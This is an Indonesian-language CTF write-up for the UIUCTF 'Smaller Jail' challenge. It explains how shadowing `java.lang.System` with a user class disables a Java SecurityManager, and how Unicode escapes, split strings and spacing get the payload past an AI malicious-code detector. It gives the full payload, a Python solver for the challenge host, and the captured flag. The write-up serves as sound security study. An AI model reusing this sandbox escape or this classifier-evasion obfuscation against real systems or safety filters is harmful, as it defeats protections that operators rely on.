# Smaller Jail

## Ringkasan

Challenge ini adalah Java sandbox dengan filter AI di depan.

Service menerima source code Java untuk `UserClass`, lalu menjalankan `UserClass.run()` di dalam jail.

Exploit tidak menyerang JVM secara langsung. Bug utamanya terdapat pada **urutan compilation**:

1. Source dari user disimpan sebagai `/tmp/UserClass.java`.
2. `javac UserClass.java` dijalankan terlebih dahulu.
3. Setelah itu `javac Jail.java` dijalankan di direktori yang sama, yaitu `/tmp`.
4. `Jail.java` menggunakan nama `System` tanpa fully-qualified name.
5. Karena kita sudah membuat class `System` di default package, compiler memilih `System` buatan user, bukan `java.lang.System`.
6. Akibatnya `System.setSecurityManager(...)` di `Jail.java` berubah menjadi pemanggilan method no-op buatan kita.
7. `SecurityManager` tidak pernah aktif.
8. `UserClass.run()` bebas membaca `/flag`.

Flag yang didapat:

```text
uiuctf{sp4c1ng_0ut_0f_j141_469b8bda50be4a10}
```

---

## File Challenge

File utama:

```text
main.py
model.py
model.safetensors
Jail.java
Dockerfile
nsjail.cfg
```

---

## Analisis `main.py`

`main.py` menerima input Java line-by-line sampai `DONE`.

Source kemudian dikirim ke model AI:

```python
source_tensor = torch.tensor(
    list(source.encode("utf8")),
    dtype=torch.long
).unsqueeze(0)

logits = model(source_tensor)

if torch.sigmoid(logits) >= 0.5:
    print("malicious code detected")
    exit()
```

Jika score berada di bawah threshold, source disimpan sebagai `UserClass.java`.

Program kemudian menjalankan:

```python
os.chdir("/tmp")
shutil.copy("/Jail.java", "Jail.java")

with open("UserClass.java", "w") as f:
    f.write(source)

os.system("javac UserClass.java 2>&1")
os.system("javac Jail.java 2>&1")
os.system("java Jail 2>&1")
```

Bagian yang sangat penting adalah urutan:

```text
javac UserClass.java
javac Jail.java
```

`UserClass.java` dikompilasi lebih dahulu di direktori `/tmp`.

---

## Analisis `Jail.java`

Jail berisi:

```java
public class Jail {
    public static void main(String[] args) {
        System.out.println("Starting the jail...");
        System.setSecurityManager(new JailSecurityManager());
        UserClass.run();
    }
}
```

Tujuannya adalah mengaktifkan `SecurityManager` sebelum menjalankan kode user.

Setelah `SecurityManager` aktif, operasi berbahaya seperti membaca file akan diblokir.

Contohnya:

```java
public void checkRead(String file) {
    // allow the loader to load the class
    if (file.equals("/tmp/UserClass.class")) {
        return;
    }

    throw new SecurityException();
}
```

Dengan `SecurityManager` yang asli, membaca:

```text
/flag
```

dari `UserClass.run()` akan gagal.

---

## Vulnerability: Class Shadowing

Vulnerability utama adalah **class shadowing pada default package**.

`Jail.java` menggunakan:

```java
System
```

tanpa menuliskan:

```java
java.lang.System
```

Java secara otomatis menyediakan class dari `java.lang`.

Namun, kita dapat membuat class bernama `System` sendiri di default package.

Karena `UserClass.java` dikompilasi terlebih dahulu, kita dapat memasukkan dua class sekaligus:

```java
class System {
    public static java.io.PrintStream out = java.lang.System.out;

    public static void setSecurityManager(SecurityManager s) {
    }
}
```

Kemudian saat `Jail.java` dikompilasi, referensi:

```java
System.setSecurityManager(new JailSecurityManager());
```

dapat terikat ke `System` buatan user.

Akibatnya pemanggilan tersebut menjadi:

```java
System.setSecurityManager(...)
```

milik class kita sendiri.

Method tersebut kosong, sehingga:

```text
SecurityManager tidak pernah aktif.
```

Setelah itu:

```java
UserClass.run();
```

berjalan tanpa sandbox security check.

---

## Bypass AI Detector

Payload tetap harus melewati model AI.

Payload dibuat pendek dan menggunakan obfuscation ringan:

```java
import java.io.*; import java.util.*; public class UserClass { public static void run(){ try { System . out . println(new Scanner ( new \u0046ile ("/"+"f"+"l"+"a"+"g") ) . next ()) ; } catch ( Throwable t ) { } } }
class System { public static java.io.PrintStream out = java.lang.System.out; public static void se\u0074SecurityManager(SecurityManager s){ } }
```

Beberapa trik yang digunakan:

### 1. Unicode escape untuk `File`

Daripada menulis:

```java
File
```

payload menggunakan:

```java
\u0046ile
```

Java compiler akan memproses Unicode escape tersebut menjadi:

```java
File
```

---

### 2. Unicode escape untuk method

Daripada menulis:

```java
setSecurityManager
```

payload menggunakan:

```java
se\u0074SecurityManager
```

`\u0074` adalah karakter:

```text
t
```

Sehingga compiler melihat:

```java
setSecurityManager
```

---

### 3. Memecah string `/flag`

Daripada menulis langsung:

```java
"/flag"
```

payload menggunakan:

```java
"/"+"f"+"l"+"a"+"g"
```

Hasil akhirnya tetap:

```text
/flag
```

---

### 4. Spacing

Akses `System.out` ditulis sebagai:

```java
System . out
```

Spacing tersebut tetap valid Java, tetapi membuat source berbeda dari pola sederhana yang mungkin lebih mudah dikenali detector.

---

## Exploit Final

Payload final:

```java
import java.io.*; import java.util.*; public class UserClass { public static void run(){ try { System . out . println(new Scanner ( new \u0046ile ("/"+"f"+"l"+"a"+"g") ) . next ()) ; } catch ( Throwable t ) { } } }
class System { public static java.io.PrintStream out = java.lang.System.out; public static void se\u0074SecurityManager(SecurityManager s){ } }
```

---

## Alur Exploit

Alur exploit secara lengkap:

```text
User source
    |
    v
AI detector
    |
    | score < 0.5
    v
UserClass.java
    |
    v
javac UserClass.java
    |
    +--> UserClass.class
    |
    +--> System.class
    |
    v
javac Jail.java
    |
    | System resolve ke class buatan user
    v
java Jail
    |
    +--> System.out.println(...)
    |
    +--> System.setSecurityManager(...)
    |        |
    |        +--> method buatan user
    |             |
    |             +--> no-op
    |
    +--> SecurityManager tidak aktif
    |
    v
UserClass.run()
    |
    v
new File("/flag")
    |
    v
Scanner(...).next()
    |
    v
FLAG
```

---

## Membaca `/flag`

Karena `SecurityManager` tidak pernah benar-benar dipasang, kode berikut dapat membaca file:

```java
new Scanner(new File("/flag")).next()
```

Kemudian hasilnya dicetak:

```java
System.out.println(...)
```

`System.out` tetap dapat digunakan karena class shadowing kita menyediakan:

```java
public static java.io.PrintStream out = java.lang.System.out;
```

Jadi kita hanya mengganti `setSecurityManager()`, sementara `out` diarahkan kembali ke `java.lang.System.out`.

---

## Solver

`solve.py`:

```python
#!/usr/bin/env python3

import re
import socket
import ssl
import subprocess
import sys
import time
from pathlib import Path

BASE_DIR = Path(__file__).resolve().parent
HOST = "smaller-jail.chal.uiuc.tf"
PORT = 1337

PAYLOAD = r'''import java.io.*; import java.util.*; public class UserClass { public static void run(){ try { System . out . println(new Scanner ( new \u0046ile ("/"+"f"+"l"+"a"+"g") ) . next ()) ; } catch ( Throwable t ) { } } }
class System { public static java.io.PrintStream out = java.lang.System.out; public static void se\u0074SecurityManager(SecurityManager s){ } }
'''


def parse_args():
    remote = False
    host = HOST
    port = PORT
    local = False

    for arg in sys.argv[1:]:
        if arg.upper() == "REMOTE":
            remote = True
        elif arg.upper() == "LOCAL":
            local = True
        elif arg.startswith("HOST="):
            host = arg.split("=", 1)[1]
        elif arg.startswith("PORT="):
            port = int(arg.split("=", 1)[1])

    if not remote and not local:
        local = True

    return remote, local, host, port


def run_local():
    uc = BASE_DIR / "UserClass.java"
    jail = BASE_DIR / "Jail.java"

    uc.write_text(PAYLOAD, encoding="utf-8")

    for p in BASE_DIR.glob("*.class"):
        p.unlink()

    subprocess.run(
        ["javac", "UserClass.java"],
        cwd=BASE_DIR,
        check=False,
    )

    subprocess.run(
        ["javac", "Jail.java"],
        cwd=BASE_DIR,
        check=False,
    )

    subprocess.run(
        ["java", "Jail"],
        cwd=BASE_DIR,
        check=False,
    )


def recv_until(sock, marker, total=20.0):
    sock.settimeout(1.0)
    data = b""
    deadline = time.time() + total

    while time.time() < deadline:
        try:
            chunk = sock.recv(4096)

            if not chunk:
                break

            data += chunk

            if marker in data:
                break

        except socket.timeout:
            continue

    return data


def recv_all(sock, total=60.0):
    sock.settimeout(1.0)
    data = b""
    deadline = time.time() + total
    flag_seen_at = None

    while time.time() < deadline:
        try:
            chunk = sock.recv(4096)

            if not chunk:
                break

            data += chunk

            if (
                re.search(rb"uiuctf\{[^}\n]+\}", data)
                and flag_seen_at is None
            ):
                flag_seen_at = time.time()

        except socket.timeout:
            if (
                flag_seen_at is not None
                and time.time() - flag_seen_at > 2.0
            ):
                break

            continue

    return data


def run_remote(host, port):
    print(f"[*] connecting to {host}:{port} over TLS")

    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    raw = socket.create_connection(
        (host, port),
        timeout=10,
    )

    io = ctx.wrap_socket(
        raw,
        server_hostname=host,
    )

    banner = recv_until(
        io,
        b"DONE\n",
        total=20.0,
    )

    print(
        banner.decode(
            "utf-8",
            "replace",
        ),
        end="",
    )

    low = banner.lower()

    if b"proof-of-work" in low and b"disabled" not in low:
        raise SystemExit(
            "[!] Remote benar-benar meminta PoW"
        )

    print(
        f"[*] sending payload: "
        f"{len(PAYLOAD.encode())} bytes"
    )

    io.sendall(
        PAYLOAD.encode("utf-8") + b"DONE\n"
    )

    out = recv_all(
        io,
        total=60.0,
    )

    text = out.decode(
        "utf-8",
        "replace",
    )

    print(text, end="")

    m = re.search(
        r"uiuctf\{[^}\n]+\}",
        text,
    )

    if m:
        print(
            f"\n<FLAG>{m.group(0)}</FLAG>"
        )
    else:
        print(
            "\n[!] flag belum terlihat di output"
        )


def main():
    remote, local, host, port = parse_args()

    if remote:
        run_remote(host, port)
    elif local:
        run_local()


if __name__ == "__main__":
    main()
```

---

## Cara Menjalankan

### Lokal

```bash
python3 solve.py
```

### Remote

```bash
python3 solve.py REMOTE HOST=smaller-jail.chal.uiuc.tf PORT=1337
```

---

## Contoh Output Remote

```text
== proof-of-work: disabled ==
Java Sandbox Runner: type code in line by line and then type DONE. UserClass.run is invoked, e.g:

public class UserClass {
    public static void run() {
        System.out.println(1 + 1);
    }
}
DONE

[*] sending payload: 364 bytes
Note: Jail.java uses or overrides a deprecated API.
Note: Recompile with -Xlint:deprecation for details.
Starting the jail...
uiuctf{sp4c1ng_0ut_0f_j141_469b8bda50be4a10}

<FLAG>uiuctf{sp4c1ng_0ut_0f_j141_469b8bda50be4a10}</FLAG>
```

---

## Kesimpulan

Challenge ini tidak membutuhkan exploit JVM yang kompleks.

Bug terjadi karena **untrusted source dikompilasi di direktori yang sama sebelum trusted `Jail.java` dikompilasi**.

Dengan membuat:

```java
class System {
    public static java.io.PrintStream out = java.lang.System.out;

    public static void setSecurityManager(SecurityManager s) {
    }
}
```

kita melakukan shadowing terhadap `System` yang digunakan oleh `Jail.java`.

Akibatnya:

```java
System.setSecurityManager(new JailSecurityManager());
```

tidak lagi mengaktifkan security manager.

Setelah sandbox berhasil dinonaktifkan, `UserClass.run()` dapat membaca:

```text
/flag
```

dan mencetak isinya.

### Flag

```text
uiuctf{sp4c1ng_0ut_0f_j141_469b8bda50be4a10}
```
